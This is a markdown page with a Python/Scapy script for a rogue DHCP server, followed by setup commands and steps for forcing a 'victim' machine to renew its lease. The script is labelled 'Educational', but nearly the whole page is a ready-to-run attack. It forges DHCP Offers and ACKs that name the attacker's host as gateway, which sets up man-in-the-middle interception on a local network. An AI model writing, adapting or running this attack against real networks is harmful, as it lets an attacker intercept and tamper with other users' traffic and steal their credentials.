# dhcp spoof

## code 

```
#!/usr/bin/env python3
"""
Educational DHCP Spoofing (Rogue DHCP Server) Script
--------------------------------------------------
Sends fake DHCP Offers & ACKs to assign attacker-controlled IP settings.
"""

from scapy.all import *
import argparse
import threading
import time
import sys

# -------------------------------
# Configuration (EDIT THESE!)
# -------------------------------
IFACE          = "eth0"          # Your network interface
ROGUE_IP       = "192.168.1.100" # IP the rogue server will claim
SUBNET_MASK    = "255.255.255.0"
GATEWAY_IP     = "192.168.1.100" # Usually same as ROGUE_IP
DNS_SERVERS    = ["8.8.8.8", "1.1.1.1"]
LEASE_TIME     = 86400           # 24 hours
DOMAIN_NAME    = "evil.corp"
# -------------------------------

# Global flag to stop threads
running = True

def parse_args():
    parser = argparse.ArgumentParser(description="Educational Rogue DHCP Server")
    parser.add_argument("-i", "--iface", default=IFACE, help="Interface to listen/send on")
    parser.add_argument("-r", "--rogue-ip", default=ROGUE_IP, help="IP the rogue server will offer")
    parser.add_argument("-g", "--gateway", default=GATEWAY_IP, help="Gateway to advertise")
    return parser.parse_args()

def build_dhcp_offer(discover_pkt, offered_ip):
    """Craft DHCP Offer in response to DHCP Discover"""
    return Ether(src=get_if_hwaddr(conf.iface), dst=discover_pkt[Ether].src)/ \
           IP(src=ROGUE_IP, dst="255.255.255.255") / \
           UDP(sport=67, dport=68) / \
           BOOTP(op=2,       # BOOTP reply
                 yiaddr=offered_ip,
                 siaddr=ROGUE_IP,
                 giaddr=discover_pkt[BOOTP].giaddr,
                 chaddr=discover_pkt[BOOTP].chaddr,
                 xid=discover_pkt[BOOTP].xid,
                 ) / \
           DHCP(options=[("message-type", "offer"),
                        ("server_id", ROGUE_IP),
                        ("lease_time", LEASE_TIME),
                        ("subnet_mask", SUBNET_MASK),
                        ("router", GATEWAY_IP),
                        ("name_server", *DNS_SERVERS),
                        ("domain", DOMAIN_NAME),
                        "end"])

def build_dhcp_ack(request_pkt, assigned_ip):
    """Craft DHCP ACK in response to DHCP Request"""
    return Ether(src=get_if_hwaddr(conf.iface), dst=request_pkt[Ether].src)/ \
           IP(src=ROGUE_IP, dst="255.255.255.255") / \
           UDP(sport=67, dport=68) / \
           BOOTP(op=2,
                 yiaddr=assigned_ip,
                 siaddr=ROGUE_IP,
                 giaddr=request_pkt[BOOTP].giaddr,
                 chaddr=request_pkt[BOOTP].chaddr,
                 xid=request_pkt[BOOTP].xid,
                 ) / \
           DHCP(options=[("message-type", "ack"),
                        ("server_id", ROGUE_IP),
                        ("lease_time", LEASE_TIME),
                        ("subnet_mask", SUBNET_MASK),
                        ("router", GATEWAY_IP),
                        ("name_server", *DNS_SERVERS),
                        ("domain", DOMAIN_NAME),
                        "end"])

def dhcp_spoof():
    print(f"[+] Rogue DHCP server started on {conf.iface} offering {ROGUE_IP}")
    print(f"    Gateway: {GATEWAY_IP} | DNS: {', '.join(DNS_SERVERS)}")

    # Simple IP pool (expand as needed)
    pool_start = ip2int(ROGUE_IP) + 10
    pool_end   = pool_start + 50
    used_ips   = set()

    while running:
        # Sniff only DHCP Discover & Request packets
        pkt = sniff(iface=conf.iface, filter="udp and (port 67 or 68)", count=1, timeout=1)
        if not pkt:
            continue
        pkt = pkt[0]

        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # Discover
            mac = pkt[Ether].src
            xid = pkt[BOOTP].xid

            # Pick next free IP
            offered_ip_int = None
            for ip_int in range(pool_start, pool_end + 1):
                if ip_int not in used_ips:
                    offered_ip_int = ip_int
                    used_ips.add(ip_int)
                    break
            if offered_ip_int is None:
                print(f"[-] IP pool exhausted for MAC {mac}")
                continue

            offered_ip = int2ip(offered_ip_int)
            print(f"[+] DISCOVER from {mac} -> Offering {offered_ip}")

            offer = build_dhcp_offer(pkt, offered_ip)
            sendp(offer, iface=conf.iface, verbose=0)

            # Store mapping for ACK
            ip_mac_map[xid] = (offered_ip, mac)

        elif DHCP in pkt and pkt[DHCP].options[0][1] == 3:  # Request
            xid = pkt[BOOTP].xid
            if xid not in ip_mac_map:
                continue
            assigned_ip, _ = ip_mac_map[xid]
            print(f"[+] REQUEST  -> ACK {assigned_ip}")
            ack = build_dhcp_ack(pkt, assigned_ip)
            sendp(ack, iface=conf.iface, verbose=0)
            del ip_mac_map[xid]

# Helper dict to track offered IPs
ip_mac_map = {}

# -------------------------------
# Utility functions
# -------------------------------
def ip2int(ip):
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def int2ip(ip_int):
    return socket.inet_ntoa(struct.pack("!I", ip_int))

# -------------------------------
# Main
# -------------------------------
if __name__ == "__main__":
    args = parse_args()
    conf.iface = args.iface
    ROGUE_IP = args.rogue_ip
    GATEWAY_IP = args.gateway

    try:
        dhcp_thread = threading.Thread(target=dhcp_spoof, daemon=True)
        dhcp_thread.start()
        print("[*] Press Ctrl+C to stop")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Shutting down rogue DHCP server...")
        running = False
        time.sleep(1)
```


# commands 

```
sudo apt update
sudo apt install python3-pip
sudo pip3 install scapy
```

```
# 1. Set your interface & IPs
sudo python3 dhcp_spoof.py -i eth0 -r 192.168.1.100 -g 192.168.1.100

# 2. On a victim VM/machine in the same broadcast domain:
#    Renew DHCP (Linux):
sudo dhclient -r && sudo dhclient
#    Or Windows: ipconfig /release && ipconfig /renew
```
